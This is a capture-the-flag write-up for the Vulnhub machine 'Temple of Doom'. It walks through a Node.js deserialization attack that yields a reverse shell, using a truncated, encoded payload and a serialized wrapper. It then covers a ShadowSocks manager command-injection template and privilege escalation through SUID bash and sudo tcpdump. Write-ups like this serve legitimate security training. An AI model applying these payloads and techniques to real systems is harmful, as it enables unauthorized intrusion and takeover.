<br><br>
![Pasted image 20241106151209](https://github.com/user-attachments/assets/7feab61c-3cd5-422e-9a59-feb330702d30)
<br><br>
**Platform : Vulnhub**
<br>
**Box : Temple of Doom**
<br>
**Difficulty : Medium**
<br>
**OS : Linux**
<br>
**Author : Francesco Basile**

<br><br>

Initial Nmap scan reveals two ports open: 22, or SSH and a service on unusual *port 666*:

<br>

`nmap -sVC --version-all --disable-arp-ping -Pn -n -p 22,666 192.168.126.241 -oN  Desktop/CTFs/VulnHub/Doom/nmap/versions_scan.txt`
<br>`Starting Nmap 7.80 ( https://nmap.org ) at 2024-10-29 23:31 CET`<br>`Nmap scan report for 192.168.126.241`<br>`Host is up (0.025s latency).`<br>`PORT    STATE SERVICE VERSION`<br>`22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)`<br>`| ssh-hostkey:`<br>`|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea (RSA)`<br>`|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d (ECDSA)`<br>`|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 (ED25519)`<br>`666/tcp open  http    Node.js Express framework`<br>`|http-title: Site doesn't have a title (text/html; charset=utf-8).`<br>`Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .`<br>`Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds`


<br><br>

Which turns to be a NodeJs application. If we interact with the server a bit, information disclosure reveals that data is being *deserialized* on the backend of the server through the *unserialize()* function.

<br>

![Pasted image 20241030235808](https://github.com/user-attachments/assets/5ac6e486-aa34-4a98-bb62-1632a91234f9)

<br><br>

A search on google

<br>

(https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

<br>

uncovers that this function it is extremely vulnerable, allowing an attacker to gain unauthenticated remote code execution. A carefully crafted payload encoded in the correct way will do the trick.
The following payload created with *nodejsshell.py* and injected in a request gives us a reverse shell:

<br>

`$ python2 nodejsshell.py 192.168.126.142 9001 > payload`
`eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,`
<br><----------SNIP----------><br>
`85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))`

<br><br>

*Serialize payload and add IIFE brackets:*

<br>

`{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,`<br><----------SNIP----------><br>
`41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}`

<br><br>

*Encode in base64:*

<br>

`cat payload | base64`
`eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IGV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCwxMTgsOTcsMTE0LDMyLDExMCwxMDEsMTE2LDMyL`<br><----------SNIP----------><br>
`g0LDQ0LDgwLDc5LDgyLDg0LDQxLDU5LDEwKSl9KCkifQ==`

<br><br>

Deliver through Burpsuite Repeater:

<br>

![Pasted image 20241031231740](https://github.com/user-attachments/assets/a30658d3-9831-4f05-bb67-131031b01167)

<br><br>

And get our reverse shell:

<br>

![Pasted image 20241106152134](https://github.com/user-attachments/assets/4775fe9f-b34e-42d7-885a-355c13f3b7a7)

<br><br>

Once on the box, we have a look at what's going on, so we find out another user *'fireman'*:

<br>

![Pasted image 20241106152928](https://github.com/user-attachments/assets/32e66d1b-3736-4cc7-8856-f0c5b9f35846)

<br>
<br>

At this point, there are two ways to lateral privesc:

<br>

1. Through a vulnerability in a process, *ShadowSocks Manager*, that is running locally
2. Through a *heavy misconfiguration* in the box, particularly the /bin/bash binary, which we find out to be owned by fireman and configured with the SUID bit on

<br>
<br>

Let's see first **ss-manager**:

<br>
<br>

Among the running processes, we see an interesting one running under fireman's context:
*ShadowSocks manager v3.1.0*:

<br>

![Pasted image 20241106153138](https://github.com/user-attachments/assets/d6ee32fa-eb5c-423e-9224-dcfdd3eee92f)

<br>

![Pasted image 20241106154938](https://github.com/user-attachments/assets/a0ecbcff-437f-4468-8b2f-d20d6bbca446)

<br>

Searching the web for information about it, we stumble upon this:

<br>

https://www.exploit-db.com/exploits/43006/

<br>
<br>

It is vulnerable to *command injection*. We can exploit the service just by connecting to localhost:8839 and sending  commands formatted in json:

<br>

`add: {"server_port":8003, "password":"test", "method":"||<INSERT_PAYLOAD>||"}`

<br>

![Pasted image 20241106160216](https://github.com/user-attachments/assets/5ff83384-4fe4-49e5-80a4-ed76884a5629)

<br>

And we are fireman:

<br>

![Pasted image 20241106160301](https://github.com/user-attachments/assets/efb8b7bd-b623-4109-ba61-c4ea894e2bd6)

<br>
<br>

Now let's see the easy way, **SUID /bin/bash**.

<br>

Enumerating i found out that the binary /bin/bash it is a *SUID*, owned by fireman:

<br>

![Pasted image 20241106153513](https://github.com/user-attachments/assets/91215196-768b-4033-89fb-4b7174a597e0)

<br>

So the plan is just to run the suid in the context of the owner with /bin/bash -p.

<br>

![Pasted image 20241106161120](https://github.com/user-attachments/assets/bb0f8811-b84b-48de-b7be-ddff1fe5fb4b)

<br>

And we are fireman again! SUID bit on that particular binary it is not exactly a great idea.

<br>

 Moving on with **PrivEsc**. Enumerating from the new user, we find out that we can run an interesting sudo command: 
 
 <br>
 
![Pasted image 20241106162047](https://github.com/user-attachments/assets/8ea99387-ca15-42e1-a016-c46d9d0a77f1)

 <br>
 
 **tcpdump**!
 
<br>

This is an easy one, as *GTFObins* gives us a *straight path*:

<br>

![Pasted image 20241106162148](https://github.com/user-attachments/assets/b8e62f81-9265-4e6b-8440-bc65bdb1c514)

<br>

Create a malicious file in /tmp and then trick the program to run this script in the context of the super user. We execute carefully all the commands:

<br>

![Pasted image 20241106163353](https://github.com/user-attachments/assets/b3a66315-8b38-4b63-8e5f-ed3d639d2d04)

<br>
<br>

We sure get our reverse shell and become root! 

<br>

![Pasted image 20241106163254](https://github.com/user-attachments/assets/a18d9275-b276-47d8-ac8b-8e00b2d9068e)

<br>

We can enjoy our flag:

<br>

![Pasted image 20241106163521](https://github.com/user-attachments/assets/260d49bf-65fb-4add-a1e4-c377e75291a1)

<br>

It says that there is another way to become root, so i might come back another day and update the writeup with the other method to PrivEsc.
